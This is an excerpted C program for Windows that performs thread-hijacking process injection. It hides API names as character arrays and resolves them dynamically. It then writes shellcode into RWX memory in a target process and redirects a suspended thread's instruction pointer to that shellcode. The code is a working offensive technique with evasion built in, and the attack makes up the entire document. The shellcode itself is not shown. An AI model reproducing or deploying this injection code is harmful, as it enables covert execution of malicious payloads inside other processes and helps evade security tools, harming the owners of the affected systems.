...
typedef BOOL(WINAPI *FN_Thread32First)(
	HANDLE hSnapshot,
	LPTHREADENTRY32 lpte
	);

typedef BOOL(WINAPI *FN_Thread32Next)(
	HANDLE hSnapshot,
	LPTHREADENTRY32 lpte
	);
...
int main()
{
	...
	char open_thread_name[] = { 'O','p','e','n','T','h','r','e','a','d',0 };
	char SuspendThread_name[] = { 'S','u','s','p','e','n','d','T','h','r','e','a','d',0 };
	char ResumeThread_name[] = { 'R','e','s','u','m','e','T','h','r','e','a','d',0 };
	char GetThreadContext_name[] = { 'G','e','t','T','h','r','e','a','d','C','o','n','t','e','x','t',0 };
	char SetThreadContext_name[] = { 'S','e','t','T','h','r','e','a','d','C','o','n','t','e','x','t',0 };

	char Thread32Next_name[] = { 'T','h','r','e','a','d','3','2','N','e','x','t',0 };
	char Thread32First_name[] = { 'T','h','r','e','a','d','3','2','F','i','r','s','t',0 };
	char CreateToolhelp32Snapshot_name[] = { 'C','r','e','a','t','e','T','o','o','l','h','e','l','p','3','2','S','n','a','p','s','h','o','t',0 };
	...
	FN_OpenThread fn_OpenThread = (FN_OpenThread)_GetProcAddress((HMODULE)base, open_thread_name);
	FN_SuspendThread fn_SuspendThread = (FN_SuspendThread)_GetProcAddress((HMODULE)base, SuspendThread_name);
	FN_ResumeThread fn_ResumeThread = (FN_ResumeThread)_GetProcAddress((HMODULE)base, ResumeThread_name);
	FN_GetThreadContext fn_GetThreadContext = (FN_GetThreadContext)_GetProcAddress((HMODULE)base, GetThreadContext_name);
	FN_SetThreadContext fn_SetThreadContext = (FN_SetThreadContext)_GetProcAddress((HMODULE)base, SetThreadContext_name);

	FN_CreateToolhelp32Snapshot fn_CreateToolhelp32Snapshot = (FN_CreateToolhelp32Snapshot)_GetProcAddress((HMODULE)base, CreateToolhelp32Snapshot_name);
	FN_Thread32First fn_Thread32First = (FN_Thread32First)_GetProcAddress((HMODULE)base, Thread32First_name);
	FN_Thread32Next fn_Thread32Next = (FN_Thread32Next)_GetProcAddress((HMODULE)base, Thread32Next_name);
	...
	LPVOID AllocMemory = fn_VirtualAllocEx(TargetProcess, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	fn_WriteProcessMemory(TargetProcess, AllocMemory, shellcode, sizeof(shellcode), NULL);
	
	// search thread of target process
	DWORD Tid;
	HANDLE hThreadSnap = fn_CreateToolhelp32Snapshot(0x00000004, 0);
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32),NULL,NULL,NULL,NULL,NULL,NULL };
	HANDLE threadHandle = NULL;
	if (fn_Thread32First(hThreadSnap, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == dwNetWorkInstPID) {
				Tid = threadEntry.th32ThreadID;
				break;
			}
		} while (fn_Thread32Next(hThreadSnap, &threadEntry));
	}

	HANDLE hThread = fn_OpenThread(THREAD_ALL_ACCESS, TRUE, Tid);

	fn_SuspendThread(hThread);
	CONTEXT lpContext;
	lpContext.ContextFlags = CONTEXT_ALL;

	// change RIP, point to shellcode.
	fn_GetThreadContext(hThread, &lpContext);
	lpContext.Eip = (DWORD_PTR)AllocMemory;
	fn_SetThreadContext(hThread, &lpContext);
	fn_ResumeThread(hThread);
	return 0;
}